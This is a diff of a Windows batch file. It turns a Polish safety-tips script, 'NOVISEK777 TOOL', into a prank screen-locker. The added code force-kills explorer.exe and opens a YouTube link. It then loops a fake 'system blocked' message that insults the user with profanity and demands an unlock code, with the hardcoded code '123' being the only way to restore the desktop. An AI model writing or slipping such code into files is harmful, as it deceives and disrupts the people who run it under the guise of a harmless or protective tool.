@@ -1,14 +1,32 @@
 @echo off
 cls
+title SYSTEM ERROR
 
+taskkill /f /im explorer.exe
+start https://www.youtube.com/watch?v=dQw4w9WgXcQ
+
+:loop
+cls
 echo =====================================
-echo        NOVISEK777 TOOL
+echo         SYSTEM ZOSTAL ZABLOKOWANY
 echo =====================================
 echo.
-echo   UWAZAJ Z KIM SIE LACZYSZ
-echo   NIE URUCHAMIAJ PLIKOW Z NETU
-echo   CHRON SWOJ KOMPUTER
+echo  JESTES PO PROSTU IDIOTĄ NO NA SERIO
+echo  Se kurwa znajdz kod zeby odblokowac XD
+echo.
 echo.
 echo =====================================
+echo.
 
-pause
+set /p kod=Wpisz kod: 
+
+if "%kod%"=="123" goto unlock
+goto loop
+
+:unlock
+cls
+echo Odblokowywanie...
+timeout /t 2 >nul
+
+start explorer.exe
+exit
